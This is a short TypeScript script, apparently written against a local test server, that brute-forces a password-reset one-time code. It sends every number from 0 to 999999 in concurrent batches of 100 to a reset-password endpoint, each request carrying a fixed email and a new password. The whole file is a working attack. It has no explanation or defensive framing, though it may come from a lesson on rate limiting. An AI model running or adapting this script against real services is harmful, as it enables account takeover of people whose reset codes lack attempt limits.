import axios from 'axios';
async function GetAttack(otp:string){
    let data = JSON.stringify({
  "email": "anil123@gmail.com",
  "otp": otp,
  "newpass": "123123"
});

let config = {
  method: 'post',
  maxBodyLength: Infinity,
  url: 'http://localhost:3000/reset-password',
  headers: { 
    'Content-Type': 'application/json'
  },
  data : data
};

 try {
    await axios.request(config)
    console.log("done for " + otp);
  } catch(e) {
      
  }

}

async function main(){
  for(let i=0;i<=999999;i+=100){

    const pr=[];
    //
    console.log("here",i);
    for(let j=0 ;j<100;j++){
      pr.push(GetAttack((i+j).toString()))
    }
    await Promise.all(pr)
  }
}
main();